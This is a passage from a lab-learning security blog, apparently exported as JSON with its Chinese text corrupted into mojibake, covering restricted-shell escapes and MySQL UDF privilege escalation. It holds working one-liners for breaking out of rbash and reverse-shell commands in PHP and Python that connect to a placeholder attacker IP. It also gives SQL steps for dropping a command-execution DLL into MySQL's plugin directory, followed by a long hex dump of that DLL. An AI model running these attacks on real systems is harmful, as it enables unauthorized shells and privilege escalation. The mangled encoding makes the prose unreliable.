SHELL=/bin/sh [3]æƒé™è¶³å¤Ÿæ—¶ cp /bin/sh /path/ ;sh æˆ– cp /bin/bash /path/ ;sh 7.2.4 åˆ©ç”¨ç³»ç»Ÿå¸¸è§åº”ç”¨é€ƒé€¸ [1]ftp [2]more [3]less [4]man [5]vi [6]vim ä»¥ä¸Šåœ¨è¾“å…¥çš„åœ°æ–¹è¾“å…¥!/bin/sh æˆ– !/bin/bash 7.2.5 åˆ©ç”¨ç”¨æˆ·å®‰è£…åº”ç”¨é€ƒé€¸ 1ã€ed-editor ed !'/bin/sh' 2ã€git git help status !/bin/bash 3ã€zip zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/bash\" 4ã€tar tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash 7.2.6 åˆ©ç”¨ç¼–ç¨‹è¯­è¨€ç¯å¢ƒç»•è¿‡ 1ã€python python -c 'import os; os.system(\"/bin/sh\")' è¿™é‡Œä¹Ÿæ˜¯è§£å¯†äº†ï¼ŒåŸæ¥æ˜¯åœ¨çœŸå®æƒ…å†µä¸‹æ‰å¯ä»¥ã€‚ã€‚ã€‚ 2ã€php php -a then exec(\"sh -i\"); è¿™é‡Œä»æœªå¤ç°æˆåŠŸï¼Œå®ƒæç¤ºæˆ‘è¯­æ³•é”™è¯¯ï¼Ÿï¼Ÿï¼Ÿä¸ç†è§£ ä½¿ç”¨PHPåå¼¹è®¾shellç»•è¿‡ æ”»å‡»æœºå¼€å¯ç›‘å¬``nc -lvp PORT``ç›®æ ‡æœºå»ºç«‹è¿æ¥``php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 3ã€perl perl -e 'exec \"/bin/sh\";' 4ã€lua os.execute('/bin/sh') åŒPHPã€‚ã€‚ã€‚ä¼°è®¡çœŸæ˜¯è¯­æ³•é—®é¢˜ï¼Ÿ 5ã€ruby exec \"/bin/sh\" 6ã€expect spwan sh sh 0x08 tips: 8.1 æ¯”rbashæ›´å®¹æ˜“é‡åˆ°çš„é—®é¢˜æ˜¯å½“å‰è·¯å¾„å¼‚å¸¸é—®é¢˜ echo $PATH ###ä¸€èˆ¬å¾ˆå¤šå‘½ä»¤åŸºç¡€æ‰§è¡Œä¸äº†çš„æ—¶å€™ï¼Œéƒ½æ˜¯è·¯å¾„å¼‚å¸¸ï¼ŒæŸ¥çœ‹è¯¥å€¼å¯éªŒè¯ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ####ä¿®å¤ 8.2 ä¸èƒ½ä½¿ç”¨ &gt; ï¼Œ&gt;&gt;ç­‰å­—ç¬¦é‡å®šå‘å†™æ–‡ä»¶ï¼šecho â€˜script codeâ€™ | tee scriptfile 8.3 suåˆ‡æ¢ç”¨æˆ·é€ƒé€¸æ—¶è¿˜å¯ä»¥åœ¨åˆ‡æ¢ç”¨æˆ·æ—¶æ‰§è¡Œspawn shellå‘½ä»¤ su -c \"python -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\" test1 8.4 ssh ç™»å½•æ—¶åŒæ ·å¯ä»¥é€šè¿‡spawn shellé€ƒé€¸ ssh username@IP \"export TERM=xterm;python -c 'import pty;pty.spawn(\\\"/bin/bash\\\")' 8.5 ç¼–ç¨‹è¯­è¨€ç»•è¿‡çš„åˆ©ç”¨ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åå¼¹shellåˆ°æˆ‘ä»¬æ”»å‡»æœºçš„æ–¹å¼è¿›è¡Œé€ƒé€¸ï¼Œä»¥pythonä¸ºä¾‹ï¼š python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LISTENING IP\",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 8.6 ä¸Šè¾¹ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ !/bin/sh å’Œ !/bin/bash;å…¶å®è¿˜æœ‰ä¸€ä¸ª !â€˜shâ€™ â€”&gt;ç”±äºæ²¡æœ‰äº† â€˜/â€™ ï¼›æœ‰æ—¶å€™èƒ½å¤Ÿè¾¾åˆ°å¾ˆå¥½çš„ç»•è¿‡æ•ˆæœ 8.7 åŒç†åœ¨è·¯å¾„æ­£ç¡®çš„æƒ…å†µä¸‹ï¼Œåœ¨å½“å‰rbashä¸­ç›´æ¥è¾“å…¥ sh ä¹Ÿèƒ½å¤Ÿå®Œæˆé€ƒé€¸( !/bin/sh å’Œ !/bin/bash é€ƒé€¸å¤±è´¥æŠ¥é”™åŒ[6] ) 0x09 æ€»ç»“ è¿™æ¬¡ä¹Ÿå°±æ˜¯ç®€å•çš„æ¼”ç¤ºäº†ä¸€ä¸‹å„ç§æƒ…å†µï¼Œæ¯•ç«Ÿç¯å¢ƒé…ç½®ä¹Ÿå¾ˆéš¾å¾ˆçƒ¦ï¼Œå› æ­¤å°±è‰è‰äº†äº‹ï¼Œåªéœ€è¦è®°å¾—æœ‰è¿™äº›å§¿åŠ¿å³å¯ï¼Œåœ¨å®æˆ˜æ—¶é‡åˆ°é—®é¢˜åœ¨å¯¹åº”è§£å†³ã€‚ ä¸Šè¿°è¿™äº›é€ƒé€¸æ–¹å¼åº”ç”¨åˆ°å…¶ä»–ç±»å‹çš„restricted shellä¸­ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œç”±äºä¸åŒç³»ç»Ÿç‰¹æ€§ä¸åŒï¼Œé€ƒé€¸çš„æ–¹å¼ä¹Ÿæœ‰å¾ˆå¤§å·®å¼‚ï¼›å†å°±æ˜¯ç”¨æˆ·é™åˆ¶çš„å®½æ¾ç¨‹åº¦ä¸åŒï¼Œæˆ‘ä»¬èƒ½å¤Ÿé€ƒé€¸çš„æ–¹å¼ä¹Ÿä¸åŒï¼›ç”¨æˆ·å®‰è£…çš„gitã€tarã€zipç­‰åº”ç”¨ä¹Ÿèƒ½å¤Ÿç»™äºˆå¾ˆå¤§çš„å¸®åŠ©ï¼›æ€»ä¹‹å°±æ˜¯è¦å¤šå°è¯•ï¼Œçµæ´»åº”ç”¨ï¼ï¼ï¼ 0x10 å‚è€ƒæ–‡ç«  ã€å®‰å…¨ã€‘Linux Restricted Shell ç»•è¿‡æŒ‡å— [æ¸—é€æŠ€å·§â€”â€”å¦‚ä½•é€ƒé€¸Linuxçš„å—é™åˆ¶shellæ‰§è¡Œä»»æ„å‘½ä»¤ ] ã€æ¸—é€æµ‹è¯•ã€‘â€” rbashé€ƒé€¸æ–¹æ³•ç®€è¿° rbashé€ƒé€¸å¤§å…¨ Restricted Bashç»•è¿‡æŠ€å·§ --å»ºç«‹rbashç¯å¢ƒå¯å‚è€ƒ DC ç³»åˆ—é¶æœºçŸ¥è¯†ç‚¹æ€»ç»“","tags":["Linuxææƒ"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"æƒé™æå‡å­¦ä¹ ","path":"/2023/09/25/windows-ti-quan-xue-xi-er/","content":"0x01 å‰è¨€ æœ¬æ–‡çš„æ¥æºä¸»è¦æ˜¯ä¸Šä¸€æ¬¡åˆ·vulnhubé¶åœºæ‰€é—ç•™çš„é—®é¢˜ï¼Œæœ¬ç€å“ªé‡Œä¸æ‡‚å­¦å“ªé‡Œçš„ç²¾ç¥è€Œæ’°å†™çš„æœ¬æ–‡ï¼Œè¿™æ¬¡ä¸»è¦å­¦ä¹ ä¸€ä¸‹MySQL udfææƒä»¥åŠå¦‚ä½•é€ƒé€¸restricted shellï¼ˆå—é™åˆ¶çš„shellï¼Œä¹Ÿç§°lshellï¼‰ã€‚ æœ€åä¼šæµ…æµ…å­¦ä¹ ä¸€ä¸‹å†…ç½‘æ¸—é€æ—¶çš„ä¸€äº›å¸¸ç”¨å·¥å…·çš„å‘½ä»¤å­¦ä¹ ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å·ï¼ï¼ï¼ 0x02 MySQL-udf ææƒ 2.1 ç®€ä»‹ UDFï¼ˆuser defind functionï¼‰ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œé€šè¿‡æ·»åŠ æ–°å‡½æ•°ï¼Œå¯¹MySQLçš„åŠŸèƒ½è¿›è¡Œæ‰©å……ã€‚è°ƒç”¨æ–¹å¼ä¸ä¸€èˆ¬ç³»ç»Ÿè‡ªå¸¦çš„å‡½æ•°ç›¸åŒï¼Œä¾‹å¦‚user()ï¼Œversion()ç­‰å‡½æ•°ã€‚ udf æ–‡ä»¶åç¼€åœ¨windowsä¸linuxç³»ç»Ÿä¸‹åˆ†åˆ«ä¸ºdllä¸soï¼Œå³åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œç”±Cã€C++ç¼–å†™ã€‚ 2.2 åˆ©ç”¨æ¡ä»¶ 1. å°†udfæ–‡ä»¶æ”¾åˆ°æŒ‡å®šä½ç½®ï¼ˆMysql&gt;5.1æ”¾åœ¨Mysqlæ ¹ç›®å½•çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹ï¼‰ 2. ä»udfæ–‡ä»¶ä¸­å¼•å…¥è‡ªå®šä¹‰å‡½æ•°(user defined function) 3. æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•° mysqlç”¨æˆ·æƒé™é—®é¢˜ è·å¾—ä¸€ä¸ªæ•°æ®åº“è´¦å·ï¼Œæ‹¥æœ‰å¯¹MySQLçš„insertå’Œdeleteæƒé™ã€‚ä»¥rootä¸ºä½³ã€‚ æ‹¥æœ‰å°†udf.dllå†™å…¥ç›¸åº”ç›®å½•çš„æƒé™ã€‚ æ•°æ®åº“ç‰ˆæœ¬é—®é¢˜ udfåˆ©ç”¨çš„å…¶ä¸­ä¸€æ­¥ï¼Œæ˜¯è¦å°†æˆ‘ä»¬çš„xxx.dllæ–‡ä»¶ä¸Šä¼ åˆ°mysqlæ£€ç´¢ç›®å½•ä¸­ï¼Œmysqlå„ç‰ˆæœ¬çš„æ£€ç´¢ç›®å½•æœ‰æ‰€ä¸åŒï¼š ç‰ˆæœ¬ è·¯å¾„ MySQL &lt; 5.0 å¯¼å‡ºè·¯å¾„éšæ„ï¼› 5.0 &lt;= MySQL&lt; 5.1 éœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½•ï¼ˆå¦‚ï¼šc:/windows/system32/ï¼‰ 5.1 &lt; MySQL å¿…é¡»å¯¼å‡ºåˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹ ä¸€èˆ¬Libã€Pluginæ–‡ä»¶å¤¹éœ€è¦æ‰‹å·¥å»ºç«‹ï¼ˆå¯ç”¨NTFS ADSæµæ¨¡å¼çªç ´è¿›è€Œåˆ›å»ºæ–‡ä»¶å¤¹ï¼‰ä¸è¿‡è¿™ç§æ–¹æ³•æš‚æœªè§è¿‡ã€‚ 2.2.1 å¸¸è§„æƒ…å†µï¼š 1. mysqlé…ç½®æ–‡ä»¶secure_file_privé¡¹è®¾ç½®ä¸ºç©ºï¼Œï¼ˆå¦‚æœä¸ºNULLæˆ–/tmp/ç­‰æŒ‡å®šç›®å½•ï¼Œå³æ— æ³•è‡ªå®šä¹‰udfæ–‡ä»¶å¯¼å‡ºä½ç½®ï¼Œåˆ™æ— æ³•åˆ©ç”¨ï¼‰ï¼› 2. CREATEæƒé™ã€FILEæƒé™ï¼ˆrootç”¨æˆ·é»˜è®¤æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼‰ã€‚ é¦–å…ˆåŸºç¡€è¯­æ³•æŸ¥è¯¢æ˜¯å¦ secure_file_priv æ²¡æœ‰é™åˆ¶ Value è¯´æ˜ NULL ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º /tmp åªå…è®¸åœ¨ /tmp ç›®å½•å¯¼å…¥å¯¼å‡º ç©º ä¸é™åˆ¶ç›®å½• åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶ åœ¨ MySQL 5.5 ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶ 2.2.2 ç‰¹æ®Šæƒ…å†µï¼š INSERTæƒé™ï¼› UPDATEæƒé™ï¼› DELETEæƒé™ã€‚ æŸ¥çœ‹å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ï¼š æˆ‘ä»¬è¿›å…¥mysqlæ‰€åœ¨çš„binç›®å½•ä¸‹æ‰“å¼€cmdè¾“å…¥è´¦å·å¯†ç ç™»å½•æ•°æ®åº“ select * from mysql.user where user = substring_index(user(), '@', 1)\\G; å¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·çš„æƒé™æƒ…å†µï¼ŒYä»£è¡¨æœ‰å¯¹åº”çš„æƒé™ 2.3 ç‰ˆæœ¬ç‰¹æ€§ udfææƒæ“ä½œä¸­çš„ä¸€ä¸ªæ­¥éª¤æ˜¯å°†æˆ‘ä»¬çš„udfæ–‡ä»¶ä¸Šä¼ åˆ°mysqlçš„æ£€ç´¢ç›®å½•ä¸­ï¼ŒWindowsç³»ç»Ÿä¸‹mysqlå„ç‰ˆæœ¬çš„æ£€ç´¢ç›®å½•æœ‰æ‰€ä¸åŒï¼š 1ã€ Mysql &lt; 5.0 å¯¼å‡ºè·¯å¾„éšæ„ã€‚ 2ã€ 5.0 &lt;= Mysql &lt; 5.1 Win2000å¯¼å‡ºè·¯å¾„ï¼š C:/Winnt/udf.dll å…¶ä»–Windowsç³»ç»Ÿå¯¼å‡ºè·¯å¾„å‡ä¸ºï¼šC:/Windows/udf.dllæˆ–C:/Windows/system32/udf.dll 3ã€ Mysql &gt;= 5.1 Mysqlå®‰è£…ç›®å½•çš„lib\\pluginæ–‡ä»¶å¤¹ä¸‹ï¼Œå¦‚æœmysqlå®‰è£…æ—¶ä¸é€‰æ‹©å®Œæ•´å®‰è£…æˆ–ä½¿ç”¨é›†æˆå¼€å‘ç¯å¢ƒç­‰æƒ…å†µä¸‹lib\\pluginç›®å½•å¤§æ¦‚ç‡æ˜¯ä¸å­˜åœ¨çš„ï¼Œéœ€è¦è‡ªè¡Œåˆ›å»ºã€‚ ç”±äºè¿™é‡Œè¿˜å¾—æ­é…ç¯å¢ƒï¼Œæˆ‘è¿™é‡Œé€‰æ‹©åœ¨è™šæ‹Ÿæœºä¸Šä¸‹è½½å°çš®ï¼ˆè‡ªå¸¦mysqlï¼‰ æ­å»ºæˆåŠŸï¼ 2.4 UDFæ–‡ä»¶ä½ç½® 1ã€sqlmapï¼š sqlmap\\data\\udf\\mysql 2ã€metaspliotï¼š /usr/share/metasploit-framework/data/exploits/mysql 2.5 æ“ä½œæ­¥éª¤ 1ã€æŸ¥çœ‹å¯å¯¼å‡ºæ–‡ä»¶ä½ç½® è¿™é‡Œçœ‹åˆ°æˆ‘æ˜¯NULLå¾ˆæ˜æ˜¾ä¸èƒ½åˆ©ç”¨äº†ï¼Œå› æ­¤æˆ‘è·Ÿç€ç½‘ä¸Šæ–‡ç« æ”¹äº†ä¸€ä¸‹é…ç½®ä¸ºç©ºï¼Œæ–¹ä¾¿æ¥ä¸‹æ¥æ“ä½œ 2ã€æŸ¥çœ‹å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™ select * from mysql.user where user = substring_index(user(), '@', 1)\\G; å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªå…³é”®çš„æƒé™ Select_priv: Y Insert_priv: Y Update_priv: Y Delete_priv: Y 3ã€ç¡®è®¤mysqlå®‰è£…ä½ç½® 4ã€é€šè¿‡ä¸»æœºç‰ˆæœ¬åŠæ¶æ„ç¡®è®¤mysqlä½æ•°æ¥é€‰ç”¨udfæ–‡ä»¶ æ­¤å¤„æ˜¾ç¤ºä¸ºWindows 64ä½æ“ä½œç³»ç»Ÿ show variables like '%compile%'; 5ã€æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ï¼Œåˆ¤æ–­udfæ–‡ä»¶å†™å…¥ä½ç½® 5.1 mysqlå¤§äº5.1ç‰ˆæœ¬æ—¶ æŸ¥çœ‹ plugin ç›®å½•ï¼Œå­˜åœ¨lib\\pluginç›®å½•ä¸”æœ‰webshellæ—¶ï¼Œç›´æ¥ä¸Šä¼ udfæ–‡ä»¶ã€‚ æŸ¥çœ‹ plugin ç›®å½•ï¼Œå­˜åœ¨lib\\pluginç›®å½•ä½†æ²¡æœ‰webshellæ—¶ï¼Œåˆ™éœ€è¦ä»¥16è¿›åˆ¶ç¼–ç å†™å…¥udfæ–‡ä»¶ã€‚ å¾ˆæ˜æ˜¾æˆ‘ä»¬è¿™é‡Œçš„æƒ…å†µæ˜¯åè€… 5.1.2 sqlmap udfæ–‡ä»¶è§£ç  â€‹ é¦–å…ˆå°†å¯¹åº”ç‰ˆæœ¬çš„udfæ–‡ä»¶è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼ˆsqlmapä¸­çš„udfæ–‡ä»¶ä¸ºé˜²æ­¢è¯¯æ€é»˜è®¤æ˜¯ç»è¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œéœ€å…ˆä½¿ç”¨sqlmapè‡ªå¸¦çš„è„šæœ¬è§£ç ï¼‰ã€‚ python3 extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 5.1.3 16è¿›åˆ¶ç¼–ç udfæ–‡ä»¶ select hex(load_file('C:\\\\lib_mysqludf_sys.dll')) into dumpfile 'C:\\\\lib_mysqludf_sys.txt'; 5.1.4 udfå†™å…¥pluginç›®å½• å°†16è¿›åˆ¶ç¼–ç åudfæ–‡ä»¶ä½¿ç”¨dumpfileå‡½æ•°å†™å…¥ç£ç›˜ï¼ˆoutfileå¯¼å‡ºæ–‡ä»¶ä¼šåœ¨æœ«å°¾å†™å…¥æ–°è¡Œä¸”è½¬ä¹‰æ¢è¡Œç¬¦ï¼Œç ´åäºŒè¿›åˆ¶æ–‡ä»¶ç»“æ„ï¼Œdumpfileä¸ä¼šè¿›è¡Œä»»ä½•æ“ä½œï¼‰ã€‚ select 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4ACA041592947A626231C0FD8CF53188186D9EF0D68295A4A148A8EF8ECECCDD64427CB1366EB75B908674B32D21DEA902D3A1C1128106464200A8B83AF334463971BCB36E418C323DB83A238243D05F62809993959B611402BDC678C90C136DE1BC3017F37320296247F15F4F6120D6276D81BC00383E8013C2075643F289C8D3D53041A787F4B8D1D4C068D13A08491790EC372B3326129A9EF4F137F2344720CC96681394D5A75FCB7C3FF174863513C813C0A5045E1137C0A180B020F94C063E343029F4C63413CFEC9B4EBED8D7ED24C03C1413C4014450458064525FFC25F6A4AB10018741F8B510B3BD2720A8B4108ED6FF8DB03C209D072104183C113C128453BCB72E16FC796B05D1CC1C3CF4CC1267AF7446992E1DA85DCBD1F4C2BC15FEAFB5ABED0140CCD0F3A24C1E81F600D2CFEF7D083E001EB02584FD644AB360196EBCAC0B66C3008EEC18B01A7FFAA128D3CC77627252205CC11CE78DCA606CB113F75463DA70FF0DD4603241B471EB801000000277C29847F3FE520000081BFF83C3DFC32A2DF2D992B7DC7F83074149D6FA3D00E7F5DC6268B2DC285586B212430BC6286B6489934E10AB9B4C856E04671D849460BB50E731C0EB110D9BE10A8D813FE6A4CB84C33DBCEB8FF00856037BA1623E9B8338975DDE016B1DF744D44D89C1D39B705DBDD8449F7D3093720D2FBDC4B4646463605DEE0E2E4B24746465E505A11000055C9A8AA298064547FB017D8069017303007D04E6F206172FFFFDFFE67756D656E7473096C6C6F77656420287564663A206C69625F6D79730BF6B7DD716C0D5F73085F696E666F29411C80EDFF232076657273696F6E20302E0134EDEDEE17A178706563744B657861076C79201A6DBB7DFB652073747243672074791B2070766175D8299B6D21724F2F7477996D60010B1F438EF6F603FB72206E616D4C436F756C246E6F74CCE8B66D3B63611320186D27796372FF850740310106023532023001240D0024F6FFB7FFD407001FC408001A740B15640C0010540B000B340A0004822776BBDCFE1918090018C40F13740E640B093427B763D4ED046217D41E5E3F1903241AEDBACF2C5007390F2A07801ABBDC6E8367165B16743711640C340B7BD85B770442130C390C01118350118B9B6DF705530133871C03E4001D5D90ED60430E057B743F09BAEEB0D80401072F67079403A06077DBC10701462F462B1074092F0DB6D94E3416033B01000715BB0BB6BD971574062F64F7DF21000884DDB640AE043439741F00BF20EEECEDB6140629034C341F0BA903E1C2DEBE240F05C305340A13234BD36D9B6E23431E14C45F0F470A75B713760554094B01098909A2071E7DE572BB1F1E742F12640D34870142B71582BB2E1311CF0C03CA96DD0E01380F387427005124A3AAFEC10246DDCD5D20D266D4FF555516C900178FA02A1B003011764BD56C039180BFA007E0126DD79DDD03703407F803680B0013026A76FBBA8603540B14021814170B581590FB2F07D9EEECF60A150310340727030034075BD5B9DD7003E0336F0724B3CC755DD7750B30074203AC0B9007F5B61B94DB03C03233920C1903C8BA05A0EB0B10074F8BE80B508375AFEB077303444707990BA0B65DD77507E503280BF0073A1C033C0038B7EB0B5007F71CA70B77B63BDB8B191D2F2007381DCB40071DAC7B5D83036C8307D30B601E9DED5EB3039B7C5F07C11E3BE0D0AE3BDB07 031F3B1007D6039C33CA1255954A005525A3AAA8AA9251645455C9D09BA0887C0402C4FF16360157616974466F7253AC7F2B40FC6C654F626ABD14566972747561F63703C46C419A0D536574456E76126DBF01E26F6EE45661726961622B41EB2E40BC18437265B8546806640DF65BF76D47264375727222502A636573734914E283CD1226135469636BB6FD6E03026E6B517565727950036684DEDBB1F66D616E3716657218446973676FDBDBCF374C6962727879436192731A52746C633BB76D0970A2722D2C7874124CBDB5ADFD6F6F6B7570463EC26916B2747279DFB5078B17CD556E77E47E4973446562736F6BED75676763A7A56583E11DFEB6B77268616E64457883704046696CA56C85C58719F19319DAB61254176D65151153DAF6586B39352B537973176DFA81E87517454173426509A3DBFE434388A0895F616D73675FCC6990B3850BBF5F5F435F73708B6966285F7E267CDB766F5F64116F035F706F6922430B76DB2663DA5F64CE280009626B31142D325F7A13C417840B5F7B50705B6C735F330A6C212205DB5ACCD82A58096E73ED6BC982130FD76D643ED6BAD6DE756C343F15416D170CDEA3E0020AB52689A3B565C933A196063BC16DB15B0772652508661115080D5BA1739C29709F73149BB5ADB93932AE6E074D0F85D7BADBC56F736A663A70105E3B84ED70705831747B6D343FDF15F4C700F08C21180800E264860600A76EFB0FE327A15AE6F00022200B020808120CB07744B314132E0010000005CF1E6C9B02020433050002088000C302F663146D160100022E063AF76C650F0A50394330908DE8DB88223C1460E2D880D4BD0118020183703AACBB024B00303A011E4644A42B2E1054822D3BD810901200DC00B3DBC63B6F602E7264A76108550B53597761DD000C03162740022E26291B61F600D805100C22273616ECECC02E702850EB27244FD820FC007273726300136027B3C7013226650942FCA664B0702728421B4036C08D6D05CA7212D3060000000000009000FF0048894C240848895424104C8944241880FA010F854502000053565755488D35CDF0FFFF488DBE0080FFFF5731DB31C94883CDFFE85000000001DB7402F3C38B1E4883EEFC11DB